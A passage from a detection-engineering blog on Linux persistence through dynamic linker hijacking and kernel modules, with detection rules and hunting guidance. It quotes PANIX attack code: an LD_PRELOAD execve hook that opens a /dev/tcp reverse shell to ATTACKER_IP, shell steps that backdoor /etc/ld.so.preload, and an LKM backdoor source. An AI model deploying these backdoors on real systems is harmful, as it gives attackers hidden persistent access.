executable is run. For more details, refer to the section on \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms#t1546004---event-triggered-execution-unix-shell-configuration-modification\",rel:\"nofollow\",children:\"shell profile modification\"}),\" in our \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"previous blog\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"With root access, an attacker can edit the \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.conf\"}),\" file or add configuration fragments to \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.conf.d/\"}),\" to insert malicious library paths. By running \",(0,n.jsx)(e.code,{children:\"ldconfig\"}),\", they can ensure these libraries are cached and prioritized in the library search order for all users and applications. For example:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`# Create a malicious shared library\n\u003e mkdir /lib/malicious\n\u003e gcc -shared -o /lib/malicious/libhack.so -fPIC /tmp/hack.c\n\u003e cp malicious_libc.so /lib/malicious/libc.so.6\n\n# Add the malicious library path to /etc/ld.so.conf and reload\n\u003e echo \"/lib/malicious\" \u003e\u003e /etc/ld.so.conf\n\u003e ldconfig\n\n# Verify with ldd\n\u003e ldd /bin/ls\n\nlinux-vdso.so.1 (0x00007ffd2b1a5000)\nlibc.so.6 =\u003e /lib/malicious/libc.so.6 (0x00007f23ac7e5000) /lib64/ld-linux-x86-64.so.2 (0x00007f23ac6e0000)\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This output indicates that the malicious \",(0,n.jsx)(e.code,{children:\"libc.so.6\"}),\" is now being loaded, hijacking the execution flow of \",(0,n.jsx)(e.code,{children:\"/bin/ls\"}),\" and potentially any other application relying on \",(0,n.jsx)(e.code,{children:\"libc.so.6\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Similarly, an attacker can manipulate the \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.preload\"}),\" file to force the dynamic linker to load a malicious shared library into every dynamically linked executable on the system. Unlike modifying the library search paths in \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.conf\"}),\", this technique directly injects a library into the execution flow, overriding or augmenting critical functions across all applications. For example:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`# Create a malicious shared library\n\u003e gcc -shared -o /lib/malicious/libhack.so -fPIC hack.c\n\n# Add the malicious library to /etc/ld.so.preload\n\u003e echo \"/lib/malicious/libhack.so\" \u003e\u003e /etc/ld.so.preload\n\n# Verify with ldd\nldd /bin/ls\n\nlinux-vdso.so.1 (0x00007ffd2b1a5000)\nlibhack.so =\u003e /lib/malicious/libhack.so (0x00007f23ac7e5000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The output shows that \",(0,n.jsx)(e.code,{children:\"libhack.so\"}),\" is loaded before any other libraries. Since \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.preload\"}),\" affects all dynamically linked executables, the attack impacts every user and application.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Additionally, root access allows for more potential attack vectors, such as:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Overwriting legitimate libraries in \",(0,n.jsx)(e.code,{children:\"/lib/\"}),\", \",(0,n.jsx)(e.code,{children:\"/lib64/\"}),\", \",(0,n.jsx)(e.code,{children:\"/usr/lib/\"}),\", or \",(0,n.jsx)(e.code,{children:\"/usr/lib64/\"}),\" with malicious versions.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Replacing and or modifying the dynamic linker binary (e.g. \",(0,n.jsx)(e.code,{children:\"ld-linux-x86-64.so.2\"}),\") to introduce backdoors or alter the library resolution process.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Modifying system-wide configuration files such as \",(0,n.jsx)(e.code,{children:\"/etc/profile\"}),\" or \",(0,n.jsx)(e.code,{children:\"/etc/bash.bashrc\"}),\" to globally set \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" or \",(0,n.jsx)(e.code,{children:\"LD_LIBRARY_PATH\"}),\".\"]}),`\n`]}),`\n`,(0,n.jsx)(e.h4,{id:\"persistence-through-t1574006---dynamic-linker-hijacking-ld_preload\",children:\"Persistence through T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Let\\u2019s examine how \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\" leverages the dynamic linker hijacking technique within the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/modules/setup_ld_preload.sh\",rel:\"nofollow\",children:\"setup_ld_preload.sh\"}),\" module. This method relies on the presence of various compilation tools on the host system. PANIX hijacks the execution flow of the \",(0,n.jsx)(e.code,{children:\"execve\"}),\" function for a user-specified binary, executing a backgrounded reverse shell whenever the binary is called:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-c\",children:`// Function pointer for the original execve\nint (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);\n\n// Function to spawn a reverse shell in the background\nvoid spawn_reverse_shell() {\n\tpid_t pid = fork();\n\tif (pid == 0) { // Child process\n\t\tsetsid(); // Start a new session\n\t\tchar command[256];\n\t\tsprintf(command, \"/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/%s/%d 0\u003e\u00261'\", ATTACKER_IP, ATTACKER_PORT);\n\t\texecl(\"/bin/bash\", \"bash\", \"-c\", command, NULL);\n\t\texit(0); // Exit child process if execl fails\n\t}\n}\n\n// Hooked execve function\nint execve(const char *pathname, char *const argv[], char *const envp[]) {\n\t// Load the original execve function\n\tif (!original_execve) {\n\t\toriginal_execve = dlsym(RTLD_NEXT, \"execve\");\n\t\tif (!original_execve) {\n\t\t\texit(1);\n\t\t}\n\t}\n\n\t// Check if the executed binary matches the specified binary\n\tif (strstr(pathname, \"$binary\") != NULL) {\n\t\t// Spawn reverse shell in the background\n\t\tspawn_reverse_shell();\n\t}\n\n\t// Call the original execve function\n\treturn original_execve(pathname, argv, envp);\n}\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"To load the malicious shared object, PANIX backdoors the \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.preload\"}),\" by default.\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-c++\",children:`// Compile the shared object\ngcc -shared -fPIC -o $preload_lib $preload_source -ldl\nif [ $? -ne 0 ]; then\n\techo \"Compilation failed. Exiting.\"\n\texit 1\nfi\n\n// Add to /etc/ld.so.preload for persistence\nif ! grep -q \"$preload_lib\" \"$preload_file\" 2\u003e/dev/null; then\n\techo $preload_lib \u003e\u003e $preload_file\n\techo \"[+] Backdoor added to /etc/ld.so.preload for persistence.\"\nelse\n\techo \"[!] Backdoor already present in /etc/ld.so.preload.\"\nfi\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s run the module:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`\u003e sudo ./panix.sh --ld-preload --ip 192.168.1.1 --port 2016 --binary ls\n\nLD_PRELOAD source code created: /tmp/preload/preload_backdoor.c \nLD_PRELOAD shared object compiled successfully: /lib/preload_backdoor.so \n[+] Backdoor added to /etc/ld.so.preload for persistence. \n[+] Execute the binary ls to trigger the reverse shell.\n`})}),`\n`,(0,n.jsx)(e.p,{children:\"When opening a session, we can see the malicious library injected into the execution flow:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-python\",children:`\u003e ldd $(which ls)                                                                      \n\nlinux-vdso.so.1 (0x00007ffe00fe8000) /lib/preload_backdoor.so (0x00007f610548e000)\nlibc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007f61052bb000)\nlibdl.so.2 =\u003e /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f61052b6000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f61054a0000)\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Executing the \",(0,n.jsx)(e.code,{children:\"ls\"}),\" command will spawn a reverse connection, while executing any other command, such as \",(0,n.jsx)(e.code,{children:\"whoami\"}),\" will not. Let\\u2019s analyze the logs in Discover:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/continuation-on-persistence-mechanisms/image2.png\",alt:\"PANIX LD_PRELOAD module execution visualized in Kibana\",title:\"PANIX LD_PRELOAD module execution visualized in Kibana\",width:\"1676\",height:\"1020\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can see PANIX being executed, after which the temporary \",(0,n.jsx)(e.code,{children:\"preload_backdoor.c\"}),\" source code is created in the \",(0,n.jsx)(e.code,{children:\"/tmp\"}),\" directory. Next, \",(0,n.jsx)(e.code,{children:\"gcc\"}),\" is used to compile the source code into a shared object and is added to the \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.preload\"}),\" file, which did not yet exist and is therefore created. After executing the \",(0,n.jsx)(e.code,{children:\"ls\"}),\" binary, the backdoor is triggered, initializing a reverse connection on the specified IP and port.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"To detect different activities along the chain, we have the following detection and endpoint rules in place:\"}),`\n`,(0,n.jsx)(e.div,{className:\"table-container\",children:(0,n.jsxs)(e.table,{children:[(0,n.jsx)(e.thead,{children:(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.th,{children:\"Category\"}),(0,n.jsx)(e.th,{children:\"Coverage\"})]})}),(0,n.jsxs)(e.tbody,{children:[(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"File\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/defense_evasion_dynamic_linker_file_creation.toml#L18\",rel:\"nofollow\",children:\"Dynamic Linker Creation or Modification\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/integrations/fim/persistence_suspicious_file_modifications.toml#L20\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/persistence_shared_object_creation.toml#L187\",rel:\"nofollow\",children:\"Shared Object Created or Changed by Previously Unknown Process\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_ld_preload_shared_object_modif.toml\",rel:\"nofollow\",children:\"Modification of Dynamic Linker Preload Shared Object\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/defense_evasion_hidden_shared_object.toml#L10\",rel:\"nofollow\",children:\"Creation of Hidden Shared Object File\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_ld_so_creation.toml\",rel:\"nofollow\",children:\"Dynamic Linker (ld.so) Creation\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:\"Process\"}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/persistence_dynamic_linker_backup.toml#L2\",rel:\"nofollow\",children:\"Dynamic Linker Copy\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/defense_evasion_shared_object_injection_via_process_environment_variable.toml\",rel:\"nofollow\",children:\"Shared Object Injection via Process Environment Variable\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{}),(0,n.jsx)(e.td,{children:(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_unusual_preload_env_vars.toml\",rel:\"nofollow\",children:\"Unusual Preload Environment Variable Process Execution\"})})]}),(0,n.jsxs)(e.tr,{children:[(0,n.jsx)(e.td,{children:(0,n.jsx)(e.em,{children:\"Detection and endpoint rules that cover dynamic linker hijacking persistence\"})}),(0,n.jsx)(e.td,{})]})]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"To revert any changes made to the system by PANIX, you can use the corresponding revert module by running:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e sudo ./panix.sh --revert ld-preload \n\n[+] Reverting ld-preload module...\n[+] Removing /lib/preload_backdoor.so from /etc/ld.so.preload...\n[+] Removed entry from /etc/ld.so.preload.\n[+] Removing malicious shared library /lib/preload_backdoor.so...\n[+] Removed /lib/preload_backdoor.so.\n[+] Removing temporary directory /tmp/preload...\n[+] Removed /tmp/preload.\n[!] Note: The backdoor may still be active in your current session.\n[!] Please restart your shell session to fully disable the backdoor.\n[!] Run 'exec bash' to start a new shell session.                                                                       \n\n\u003e exec bash \n`})}),`\n`,(0,n.jsx)(e.h4,{id:\"hunting-for-t1574006---dynamic-linker-hijacking-ld_preload\",children:\"Hunting for T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Other than relying on detections, it is important to incorporate threat hunting into your workflow. This publication will solely list the available hunts for each persistence mechanism; however, more details regarding the basics of threat hunting are outlined in the \\u201C\",(0,n.jsx)(e.em,{children:\"Hunting for T1053 - scheduled task/job\"}),\"\\u201D section of \\u201C\",(0,n.jsx)(e.em,{children:(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"Linux Detection Engineering -  A primer on persistence mechanisms\"})}),\"\\u201D. Additionally, descriptions and references can be found in our \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules\",rel:\"nofollow\",children:\"Detection Rules repository\"}),\", specifically in the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/tree/main/hunting\",rel:\"nofollow\",children:\"Linux hunting subdirectory\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can hunt for this technique using \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html\",rel:\"nofollow\",children:\"ES|QL\"}),\" and \",(0,n.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/kibana/current/osquery.html\",rel:\"nofollow\",children:\"OSQuery\"}),\" by focusing on the misuse of dynamic linker environment variables like \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" and \",(0,n.jsx)(e.code,{children:\"LD_LIBRARY_PATH\"}),\". The approach includes monitoring for the following:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Processes with suspicious environment variables:\"}),\" Tracks processes with \",(0,n.jsx)(e.code,{children:\"LD_PRELOAD\"}),\" and \",(0,n.jsx)(e.code,{children:\"LD_LIBRARY_PATH\"}),\" set to unusual values.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsxs)(e.strong,{children:[\"Creation of shared object (\",(0,n.jsx)(e.code,{children:\".so\"}),\") files:\"]}),\" Observes \",(0,n.jsx)(e.code,{children:\".so\"}),\" files created in non-standard or uncommon directories, which could indicate malicious activity.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.strong,{children:\"Modifications to critical dynamic linker files:\"}),\" Monitors changes to files like \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.preload\"}),\", \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.conf\"}),\", and associated directories such as \",(0,n.jsx)(e.code,{children:\"/etc/ld.so.conf.d/\"}),\".\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"By combining the \",(0,n.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_dynamic_linker_hijacking.md\",rel:\"nofollow\",children:\"Persistence via Dynamic Linker Hijacking\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1574/006/\",rel:\"nofollow\",children:\"T1574.006\"}),\".\"]}),`\n`,(0,n.jsx)(e.h2,{id:\"t1547006---boot-or-logon-autostart-execution-kernel-modules-and-extensions\",children:\"T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions\"}),`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.a,{href:\"https://man.openbsd.org/OpenBSD-5.1/lkm.4\",rel:\"nofollow\",children:\"Loadable Kernel Modules (LKMs)\"}),\" provide a way to extend kernel functionality without modifying the core kernel itself. These modules can be dynamically loaded and unloaded at runtime, enabling features like hardware driver support, network protocol handling, and file system management.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Modules are typically stored in the \",(0,n.jsx)(e.code,{children:\"/lib/modules/\"}),\" or \",(0,n.jsx)(e.code,{children:\"/usr/lib/modules/\"}),\" directory followed by a subdirectory for the active kernel version and are organized into subdirectories based on their functionality, such as drivers or network protocols. To ensure an LKM is loaded on boot, the following configuration files are read:\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/etc/modules\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/etc/modprobe.d/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/usr/lib/modprobe.d/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/etc/modules-load.d/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/run/modules-load.d/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/usr/local/lib/modules-load.d/\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.code,{children:\"/usr/lib/modules-load.d/\"})}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Management tools like \",(0,n.jsx)(e.code,{children:\"modprobe\"}),\", \",(0,n.jsx)(e.code,{children:\"insmod\"}),\", and \",(0,n.jsx)(e.code,{children:\"rmmod\"}),\" are used to load, list, or unload modules.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"When an LKM is loaded, the following sequence occurs:\"}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"User-space invocation:\",(0,n.jsx)(e.br,{}),`\n`,\"a. A user with sufficient privileges initiates the loading process using tools like \",(0,n.jsx)(e.code,{children:\"modprobe\"}),\" or \",(0,n.jsx)(e.code,{children:\"insmod\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Syscall invocation:\",(0,n.jsx)(e.br,{}),`\n`,\"a. \",(0,n.jsx)(e.code,{children:\"init_module()\"}),\": Loads a module from memory.\",(0,n.jsx)(e.br,{}),`\n`,\"b. \",(0,n.jsx)(e.code,{children:\"finit_module()\"}),\": Loads a module from a file descriptor.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Kernel validation:\",(0,n.jsx)(e.br,{}),`\n`,\"a. The kernel verifies the module's integrity, structure, and compatibility.\",(0,n.jsx)(e.br,{}),`\n`,\"b. Checks include validation of the ELF format and kernel version compatibility using metadata like \",(0,n.jsx)(e.code,{children:\"vermagic\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Dependency Resolution:\",(0,n.jsx)(e.br,{}),`\n`,\"a. Tools like \",(0,n.jsx)(e.code,{children:\"depmod\"}),\" generate dependency files that \",(0,n.jsx)(e.code,{children:\"modprobe\"}),\" uses to load any required modules.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Initialization and integration:\",(0,n.jsx)(e.br,{}),`\n`,\"a. The module's initialization function is executed, integrating it with the kernel's functionality through exported symbols and interfaces.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Newer systems leverage \",(0,n.jsx)(e.code,{children:\"systemd\"}),\" to invoke module loading during startup based on unit dependencies specified in service files. Older systems may still use scripts in \",(0,n.jsx)(e.code,{children:\"/etc/init.d/\"}),\" or \",(0,n.jsx)(e.code,{children:\"/etc/rc.d/\"}),\" to load modules at boot.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"The kernel prioritizes modules based on their order in dependency files or init system configurations. The search and load process typically follows:\"}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsxs)(e.li,{children:[\"Default paths specified in \",(0,n.jsx)(e.code,{children:\"/lib/modules/\"}),\" or \",(0,n.jsx)(e.code,{children:\"/usr/lib/modules/\"})]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Overrides defined in \",(0,n.jsx)(e.code,{children:\"/etc/modprobe.d/\"}),\" or \",(0,n.jsx)(e.code,{children:\"/usr/lib/modeprobe.d/\"})]}),`\n`,(0,n.jsxs)(e.li,{children:[\"Kernel command-line parameters (e.g., \",(0,n.jsx)(e.code,{children:\"modprobe.blacklist\"}),\").\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"The flexibility and power of LKMs make them a double-edged sword, as they are not only indispensable for system functionality but also a potential vector for sophisticated threats, such as rootkits. MITRE tracks this technique under \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1547/006/\",rel:\"nofollow\",children:\"T1547.006\"}),\".\"]}),`\n`,(0,n.jsx)(e.h3,{id:\"t1014---rootkit\",children:\"T1014 - Rootkit\"}),`\n`,(0,n.jsx)(e.p,{children:\"Rootkits are a class of malicious software designed to conceal their presence and maintain persistent access to a system. They operate at various levels, from user-space applications to kernel-level modules. Kernel-level rootkits leverage LKMs, manipulating kernel behavior to hide processes, files, and network activity, making them difficult to detect.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"While rootkits are a broad and advanced topic, they are closely related to T1547.006 - Kernel Modules and Extensions. By modifying kernel structures or intercepting system calls, these rootkits can gain deep control over the system while remaining hidden from standard detection methods. MITRE tracks Rootkits specifically under \",(0,n.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1014/\",rel:\"nofollow\",children:\"T1014\"}),\".\"]}),`\n`,(0,n.jsx)(e.h4,{id:\"future-work-t1014---rootkit\",children:\"Future Work: T1014 - Rootkit\"}),`\n`,(0,n.jsx)(e.p,{children:\"Rootkits are a vast topic deserving dedicated attention. In upcoming publications, we will explore:\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:\"The basics of rootkits.\"}),`\n`,(0,n.jsx)(e.li,{children:\"Techniques for detecting and hunting rootkits.\"}),`\n`,(0,n.jsx)(e.li,{children:\"Real-world examples of rootkit attacks and defenses.\"}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"For now, understanding how LKMs are used as a vector for kernel rootkits bridges the gap between T1547.006 - Kernel Modules and Extensions and the broader topic of rootkits. This blog lays the groundwork for the in-depth exploration of rootkits to come.\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"Can\\u2019t wait to learn more about rootkits? Read our recent research, \\u201C\",(0,n.jsx)(e.em,{children:(0,n.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/declawing-pumakit\",rel:\"nofollow\",children:\"Declawing PUMAKIT\"})}),\"\\u201D, a sophisticated LKM rootkit that employs mechanisms to hide its presence and maintain communication with its C2 servers.\"]}),`\n`,(0,n.jsx)(e.h4,{id:\"persistence-through-t1547006---kernel-modules-and-extensions\",children:\"Persistence through T1547.006 - Kernel Modules and Extensions\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"While T1547.006 and T1014 share some overlap, PANIX includes two distinct modules: one for a basic LKM and another for a fully implemented rootkit. We\\u2019ll begin with the simple LKM using the \",(0,n.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/modules/setup_lkm.sh\",rel:\"nofollow\",children:\"setup_lkm.sh\"}),\" module for T1547. As before, this module requires kernel headers and compilation tools to be available on the host.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"The LKM being created is a simple module that spawns a separate thread to execute a specified command. Once the command is executed, the thread enters a sleep state for 60 seconds before repeating the process in an infinite while loop.\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-c\",children:`#include \u003clinux/module.h\u003e\n#include \u003clinux/kernel.h\u003e\n#include \u003clinux/init.h\u003e\n#include \u003clinux/kthread.h\u003e\n#include \u003clinux/delay.h\u003e\n#include \u003clinux/signal.h\u003e\n\nstatic struct task_struct *task;\n\nstatic int backdoor_thread(void *arg) {\n\tallow_signal(SIGKILL);\n\twhile (!kthread_should_stop()) {\n\t\tchar *argv[] = {$command};\n\t\tcall_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);\n\t\tssleep(60);\n\t}\n\treturn 0;\n}\n\nstatic int __init lkm_backdoor_init(void) {\n\tprintk(KERN_INFO \"Loading LKM backdoor module\\\\\\\\n\");\n\ttask = kthread_run(backdoor_thread, NULL, \"lkm_backdoor_thread\");\n\treturn 0;\n}\n\nstatic void __exit lkm_backdoor_exit(void) {\n\tprintk(KERN_INFO \"Removing LKM backdoor module\\\\\\\\n\");\n\tif (task) {\n\t\tkthread_stop(task);\n\t}\n}\n\nmodule_init(lkm_backdoor_init);\nmodule_exit(lkm_backdoor_exit);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"PANIX\");\nMODULE_DESCRIPTION(\"LKM Backdoor\");\n`})}),`\n`,(0,n.jsxs)(e.p,{children:[\"After compilation with \",(0,n.jsx)(e.code,{children:\"make\"}),\" and \",(0,n.jsx)(e.code,{children:\"gcc\"}),\", it copies the LKM to \",(0,n.jsx)(e.code,{children:\"/lib/modules/$(uname -r)/kernel/drivers/${lkm_name}.ko\"}),\" and executes the \",(0,n.jsx)(e.code,{children:\"sudo insmod ${lkm_destination}\"}),\" to load the module. The \",(0,n.jsx)(e.code,{children:\"$(uname -r)\"}),\" command ensures that the path corresponding to the active kernel version is resolved.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s run the module:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"language-bash\",children:`\u003e sudo ./panix.sh --lkm --default --ip 192.168.1.1 --port 2017\n\n[+] Kernel module source code created: /tmp/lkm/panix.c\n[+] Makefile created: /tmp/lkm/Makefile \n[+] Kernel module compiled successfully: /lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko\n[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/...\n[+] Kernel module loaded successfully. Check dmesg for the output.\n[+] Kernel module added to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/\n[+] LKM backdoor established! \n`})}),`\n`,(0,n.jsx)(e.p,{children:\"Taking a look at the remnants left behind in Discover, we can see:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/assets/images/continuation-on-persistence-mechanisms/image5.png\",alt:\"PANIX LKM module execution visualized in Kibana\",title:\"PANIX LKM module execution visualized in Kibana\",width:\"1588\",height:\"1240\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"PANIX is executed, initiating the compilation process for the LKM using \",(0,n.jsx)(e.code,{children:\"make\"}),\", ensuring it is built for the active kernel version. Once compiled, the resulting \",(0,n.jsx)(e.code,{children:\"panix.ko\"}),\" module is placed in the appropriate module library directory for the current kernel. To achieve persistence across reboots, a configuration file named \",(0,n.jsx)(e.code,{children:\"panix.conf\"}),\" is created in both \",(0,n.jsx)(e.code,{children:\"/etc/modules-load.d/\"}),\" and \",(0,n.jsx)(e.code,{children:\"/usr/lib/modules-load.d/\"}),\". The module is then loaded into the kernel using the \",(0,n.jsx)(e.code,{children:\"insmod\"}),\" command, activating the reverse shell. Leveraging the Auditd Manager integration, we can observe the \",(0,n.jsx)(e.code,{children:\"kmod\"}),\" utility loading the \",(0,n.jsx)(e.code,{children:\"panix\"}),\" kernel module.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"This technique can leave behind several traces. The following detection- and endpoint rules are in place to effectively detect 